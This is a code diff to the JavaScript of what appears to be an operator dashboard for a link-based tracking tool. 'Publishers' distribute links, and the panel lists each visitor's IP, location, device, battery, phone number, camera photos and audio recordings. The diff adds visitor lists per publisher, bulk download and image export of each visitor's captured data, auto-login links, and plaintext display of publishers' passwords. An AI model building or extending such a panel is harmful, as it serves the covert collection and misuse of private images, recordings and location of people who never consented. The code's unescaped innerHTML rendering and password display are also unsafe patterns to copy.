@@ -149,6 +149,7 @@ function createPublisher() {
         if (data.success) {
             document.getElementById('publisherLinkContainer').style.display = 'block';
             document.getElementById('publisherLinkDisplay').value = data.link;
+            document.getElementById('publisherAutoLinkDisplay').value = data.autoLoginLink;
             showNotification('✅ Publisher created!');
             document.getElementById('publisherEmail').value = '';
             document.getElementById('publisherPassword').value = '';
@@ -169,25 +170,79 @@ function displayPublishers(publishers) {
         container.innerHTML = '<p style="color:#999; text-align:center; padding:20px;">No publishers created yet.</p>';
         return;
     }
-    publishers.forEach(p => {
+    publishers.forEach((p, index) => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
+        const statusColor = p.suspended ? '#fc8181' : '#48bb78';
+        const statusText = p.suspended ? '🔴 Suspended' : '🟢 Active';
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
-                    <strong>📢 ${p.email}</strong>
-                    <div style="font-size:13px; color:#888; margin-top:3px;">🔗 ${p.link}</div>
+                    <strong>📢 #${index + 1} ${p.email}</strong>
+                    <div style="font-size:12px; color:#888; margin-top:3px;">🔗 ${p.link}</div>
                     <div style="font-size:12px; color:#888;">📅 ${new Date(p.createdAt).toLocaleString()}</div>
+                    <div style="font-size:12px; color:#888;">🔑 Password: ${p.password}</div>
+                    <div style="font-size:12px; color:${statusColor};">${statusText}</div>
                 </div>
                 <span style="padding:5px 10px; background:#9f7aea; color:white; border-radius:5px; font-size:12px;">👥 ${p.totalVisits || 0} visits</span>
             </div>
             <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                 <button onclick="copyToClipboard('${p.link}')" class="camera-btn" style="background:#9f7aea;">📋 Copy</button>
+                <button onclick="copyToClipboard('${p.autoLoginLink}')" class="camera-btn" style="background:#48bb78;">🔗 Auto Login</button>
                 <button onclick="showPublisherDetails('${p.id}')" class="camera-btn" style="background:#667eea;">📊 Details</button>
+                <button onclick="viewPublisherVisitors('${p.id}')" class="camera-btn" style="background:#ed8936;">👥 Visitors</button>
+                <button onclick="toggleSuspendPublisher('${p.id}')" class="camera-btn" style="background:${p.suspended ? '#48bb78' : '#fc8181'}">
+                    ${p.suspended ? '🔄 Unsuspend' : '⛔ Suspend'}
+                </button>
             </div>
         `;
         container.appendChild(card);
     });
+}
+
+function toggleSuspendPublisher(publisherId) {
+    if (!confirm('Toggle suspend status for this publisher?')) return;
+    fetch(`/api/publisher/${publisherId}/suspend`, { method: 'PUT' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification(data.suspended ? '⛔ Publisher suspended' : '🔄 Publisher unsuspended');
+                loadAllData();
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
+        });
+}
+
+function viewPublisherVisitors(publisherId) {
+    fetch(`/api/publisher-visitors/${publisherId}`)
+        .then(response => response.json())
+        .then(visitors => {
+            const modal = document.getElementById('publisherVisitorsModal');
+            const content = document.getElementById('publisherVisitorsContent');
+            content.innerHTML = '';
+            
+            if (!visitors || visitors.length === 0) {
+                content.innerHTML = '<p style="color:#999;">No visitors yet for this publisher</p>';
+            } else {
+                visitors.forEach((v, index) => {
+                    const card = document.createElement('div');
+                    card.style.cssText = 'padding:8px; border-bottom:1px solid #eee; font-size:13px;';
+                    card.innerHTML = `
+                        <strong>#${index + 1}</strong> 🆔 ${v.id.substring(0, 8)} 
+                        📱 ${v.deviceName || 'Unknown'} 
+                        ${v.ip ? `🌐 ${v.ip}` : ''}
+                        📅 ${v.visitDate ? new Date(v.visitDate).toLocaleString() : 'N/A'}
+                        ${v.location ? `📍 ${v.location.city || ''} ${v.location.state || ''}` : ''}
+                        <button onclick="copyToClipboard('${v.id}')" class="camera-btn" style="padding:2px 8px; font-size:10px;">📋</button>
+                        ${v.frontCamera ? `<button onclick="downloadPhoto('${v.frontCamera.image || v.frontCamera}', 'front-${v.id}.jpg')" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#48bb78;">⬇️</button>` : ''}
+                    `;
+                    content.appendChild(card);
+                });
+            }
+            modal.style.display = 'flex';
+        });
 }
 
 function showPublisherDetails(publisherId) {
@@ -199,22 +254,71 @@ function showPublisherDetails(publisherId) {
             content.innerHTML = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                     <div class="detail-card"><label>📧 Email</label><div class="value">${publisher.email}</div></div>
+                    <div class="detail-card"><label>🔑 Password</label><div class="value">${publisher.password}</div></div>
                     <div class="detail-card"><label>🔗 Link</label><div class="value">${publisher.link}</div></div>
                     <div class="detail-card"><label>📅 Created</label><div class="value">${new Date(publisher.createdAt).toLocaleString()}</div></div>
                     <div class="detail-card"><label>👥 Total Visits</label><div class="value">${publisher.totalVisits || 0}</div></div>
                     <div class="detail-card"><label>🆔 Publisher ID</label><div class="value">${publisher.id}</div></div>
                     <div class="detail-card"><label>📊 Users</label><div class="value">${(publisher.users || []).length} users</div></div>
+                    <div class="detail-card"><label>⛔ Status</label><div class="value" style="color:${publisher.suspended ? '#fc8181' : '#48bb78'}">${publisher.suspended ? 'Suspended' : 'Active'}</div></div>
                 </div>
-                <h4 style="margin-top:15px;">👥 Users Data</h4>
-                <div style="max-height:200px; overflow-y:auto;">
-                    ${(publisher.users || []).length > 0 ? publisher.users.map((u, i) => `
-                        <div style="padding:5px; border-bottom:1px solid #eee; font-size:13px;">
-                            #${i+1} 🆔 ${u.id} - 📱 ${u.deviceName || 'Unknown'} - 📅 ${u.visitDate ? new Date(u.visitDate).toLocaleString() : 'N/A'}
-                        </div>
-                    `).join('') : '<p style="color:#999;">No users yet</p>'}
-                </div>
+                <button onclick="exportPublisherData('${publisherId}')" class="camera-btn" style="background:#48bb78; margin-top:15px;">📥 Export All Data</button>
             `;
             modal.style.display = 'flex';
+        });
+}
+
+function exportPublisherData(publisherId) {
+    fetch(`/api/publisher-data/${publisherId}`)
+        .then(response => response.json())
+        .then(publisher => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+            
+            const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+            gradient.addColorStop(0, '#0f0c29');
+            gradient.addColorStop(0.5, '#302b63');
+            gradient.addColorStop(1, '#24243e');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 800, 600);
+            
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 28px Arial';
+            ctx.fillText('📢 Publisher Data Report', 30, 50);
+            ctx.fillStyle = '#667eea';
+            ctx.font = '14px Arial';
+            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
+            
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 18px Arial';
+            ctx.fillText('📋 Publisher Information', 30, 110);
+            
+            const info = [
+                `Email: ${publisher.email}`,
+                `Password: ${publisher.password}`,
+                `ID: ${publisher.id}`,
+                `Created: ${new Date(publisher.createdAt).toLocaleString()}`,
+                `Total Visits: ${publisher.totalVisits || 0}`,
+                `Total Users: ${(publisher.users || []).length}`,
+                `Status: ${publisher.suspended ? 'Suspended' : 'Active'}`
+            ];
+            
+            ctx.fillStyle = 'rgba(255,255,255,0.8)';
+            ctx.font = '13px Arial';
+            info.forEach((line, i) => {
+                ctx.fillText(line, 40, 140 + i * 22);
+            });
+            
+            ctx.fillStyle = 'rgba(255,255,255,0.3)';
+            ctx.font = '12px Arial';
+            ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 570);
+            
+            const link = document.createElement('a');
+            link.download = `publisher-data-${publisher.id}.png`;
+            link.href = canvas.toDataURL('image/png');
+            link.click();
         });
 }
 
@@ -228,16 +332,17 @@ function displaySuperUsers(users) {
         container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No super power users yet.</p>';
         return;
     }
-    users.forEach(user => {
+    users.forEach((user, index) => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
         const data = user.data || {};
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
-                    <strong>⚡ Super User</strong>
+                    <strong>⚡ #${index + 1} Super User</strong>
                     <div style="font-size:13px; color:#888; margin-top:3px;">🆔 ${user.id}</div>
                     <div style="font-size:12px; color:#888;">📅 ${new Date(user.createdAt).toLocaleString()}</div>
+                    <div style="font-size:12px; color:#888;">🔗 Link ID: ${user.linkId || 'N/A'}</div>
                 </div>
                 <span style="padding:5px 10px; background:#f6ad55; color:white; border-radius:5px; font-size:12px;">⭐ Super</span>
             </div>
@@ -387,7 +492,7 @@ function displayVisitors(visitors) {
     const container = document.getElementById('visitorsList');
     container.innerHTML = '';
     const recent = visitors.slice(-10).reverse();
-    recent.forEach(visitor => {
+    recent.forEach((visitor, index) => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
         let locationStr = '';
@@ -398,7 +503,7 @@ function displayVisitors(visitors) {
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
-                    <strong>ID: ${visitor.id.substring(0, 8)}</strong>
+                    <strong>#${index + 1} ID: ${visitor.id.substring(0, 8)}</strong>
                     <div style="font-size:13px; color:#666; margin-top:3px;">
                         📱 ${visitor.deviceName || 'Unknown'} 
                         ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
@@ -473,7 +578,7 @@ function displayAllUsers(users) {
     
     document.getElementById('userCount').textContent = `(${filteredUsers.length} users)`;
     
-    filteredUsers.forEach(user => {
+    filteredUsers.forEach((user, index) => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
         card.id = 'user-' + user.id;
@@ -488,7 +593,7 @@ function displayAllUsers(users) {
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
-                    <strong>🆔 ${user.id}</strong>
+                    <strong>#${index + 1} 🆔 ${user.id}</strong>
                     <div style="font-size:13px; color:#666; margin-top:3px;">
                         📱 ${user.deviceName || 'Unknown'} 
                         ${user.ip ? `• 🌐 ${user.ip}` : ''}
@@ -610,7 +715,7 @@ function clearFilters() {
 }
 
 // ============================================
-// SHOW USER DETAILS - COMPLETE
+// SHOW USER DETAILS - WITH DOWNLOAD & EXPORT
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -650,6 +755,7 @@ function showUserDetails(userId) {
                 visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
             }
             
+            // Photos with Download & Export
             const frontPhoto = user.frontCamera || null;
             const backPhoto = user.backCamera || null;
             
@@ -824,8 +930,10 @@ function showUserDetails(userId) {
                         <h3 style="margin-top:15px;">🎙️ Audio Recording</h3>
                         ${audioHTML || '<p style="color:#999;">No audio recording available</p>'}
                         
-                        <div style="margin-top:15px;">
-                            <button onclick="exportVisitorData('${user.id}')" class="camera-btn" style="background:#48bb78; padding:10px 20px;">📥 Export All Data</button>
+                        <div style="margin-top:15px; display:flex; gap:10px; flex-wrap:wrap;">
+                            <button onclick="downloadAllVisitorData('${user.id}')" class="camera-btn" style="background:#48bb78; padding:8px 16px;">📥 Download All Data</button>
+                            <button onclick="exportVisitorData('${user.id}')" class="camera-btn" style="background:#667eea; padding:8px 16px;">📤 Export as Image</button>
+                            <button onclick="copyToClipboard('${JSON.stringify(user, null, 2)}')" class="camera-btn" style="background:#ed8936; padding:8px 16px;">📋 Copy JSON</button>
                         </div>
                     </div>
                     <div>
@@ -875,6 +983,25 @@ function showUserDetails(userId) {
 }
 
 // ============================================
+// DOWNLOAD ALL VISITOR DATA
+// ============================================
+function downloadAllVisitorData(userId) {
+    fetch(`/api/visitor/${userId}`)
+        .then(response => response.json())
+        .then(user => {
+            const dataStr = JSON.stringify(user, null, 2);
+            const blob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `visitor-${userId}-data.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showNotification('📥 Data downloaded successfully!');
+        });
+}
+
+// ============================================
 // EXPORT VISITOR DATA AS IMAGE
 // ============================================
 function exportVisitorData(userId) {
@@ -883,29 +1010,23 @@ function exportVisitorData(userId) {
         .then(user => {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            
-            // Set canvas size
             canvas.width = 800;
-            canvas.height = 600;
+            canvas.height = 700;
             
-            // Background
-            const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+            const gradient = ctx.createLinearGradient(0, 0, 800, 700);
             gradient.addColorStop(0, '#0f0c29');
             gradient.addColorStop(0.5, '#302b63');
             gradient.addColorStop(1, '#24243e');
             ctx.fillStyle = gradient;
-            ctx.fillRect(0, 0, 800, 600);
+            ctx.fillRect(0, 0, 800, 700);
             
-            // Header
             ctx.fillStyle = '#ffffff';
             ctx.font = 'bold 28px Arial';
             ctx.fillText('📊 Visitor Data Report', 30, 50);
-            
             ctx.fillStyle = '#667eea';
             ctx.font = '14px Arial';
             ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
             
-            // User Info
             ctx.fillStyle = '#ffffff';
             ctx.font = 'bold 18px Arial';
             ctx.fillText('👤 User Information', 30, 110);
@@ -919,7 +1040,8 @@ function exportVisitorData(userId) {
                 `Battery: ${user.battery || 'N/A'}%`,
                 `Network: ${user.network?.effectiveType || user.network?.type || 'N/A'}`,
                 `Visits: ${user.totalVisits || 0}`,
-                `First Visit: ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}`
+                `First Visit: ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}`,
+                `Phone: ${user.phoneNumber || 'N/A'}`
             ];
             
             ctx.fillStyle = 'rgba(255,255,255,0.8)';
@@ -928,9 +1050,9 @@ function exportVisitorData(userId) {
                 ctx.fillText(line, 40, 140 + i * 22);
             });
             
-            // Load and draw photos
-            let yPos = 340;
+            let yPos = 350;
             let photosLoaded = 0;
+            const totalPhotos = (user.frontCamera ? 1 : 0) + (user.backCamera ? 1 : 0);
             
             const drawPhoto = (imgSrc, label, y) => {
                 const img = new Image();
@@ -948,16 +1070,16 @@ function exportVisitorData(userId) {
                     
                     ctx.drawImage(img, 40, y + 5, width, height);
                     photosLoaded++;
-                    if (photosLoaded >= 2) {
-                        // Footer
+                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
                         ctx.fillStyle = 'rgba(255,255,255,0.3)';
                         ctx.font = '12px Arial';
-                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 570);
+                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 670);
                         
                         const link = document.createElement('a');
-                        link.download = `visitor-data-${user.id}.png`;
+                        link.download = `visitor-${user.id}-report.png`;
                         link.href = canvas.toDataURL('image/png');
                         link.click();
+                        showNotification('📤 Image exported successfully!');
                     }
                 };
                 img.src = imgSrc;
@@ -965,22 +1087,27 @@ function exportVisitorData(userId) {
             
             if (user.frontCamera) {
                 const imgSrc = user.frontCamera.image || user.frontCamera;
-                drawPhoto(imgSrc, '📸 Front Camera', 310);
+                drawPhoto(imgSrc, '📸 Front Camera', 320);
             }
             if (user.backCamera) {
                 const imgSrc = user.backCamera.image || user.backCamera;
-                drawPhoto(imgSrc, '📸 Back Camera', 470);
+                drawPhoto(imgSrc, '📸 Back Camera', 480);
             }
             
             if (!user.frontCamera && !user.backCamera) {
                 ctx.fillStyle = 'rgba(255,255,255,0.5)';
                 ctx.font = '14px Arial';
-                ctx.fillText('No photos available', 40, 350);
+                ctx.fillText('No photos available', 40, 360);
+                
+                ctx.fillStyle = 'rgba(255,255,255,0.3)';
+                ctx.font = '12px Arial';
+                ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 670);
                 
                 const link = document.createElement('a');
-                link.download = `visitor-data-${user.id}.png`;
+                link.download = `visitor-${user.id}-report.png`;
                 link.href = canvas.toDataURL('image/png');
                 link.click();
+                showNotification('📤 Image exported successfully!');
             }
         });
 }
@@ -990,7 +1117,6 @@ function exportVisitorData(userId) {
 // ============================================
 function deletePhoto(userId, type) {
     if (!confirm(`Delete ${type} photo permanently?`)) return;
-    
     fetch(`/api/visitor/${userId}/photo/${type}`, { method: 'DELETE' })
         .then(response => response.json())
         .then(data => {
@@ -1006,7 +1132,7 @@ function deletePhoto(userId, type) {
 }
 
 // ============================================
-// SHOW VISIT DETAILS (Modal)
+// SHOW VISIT DETAILS
 // ============================================
 function showVisitDetails(userId, visitIndex) {
     fetch(`/api/visitor/${userId}`)
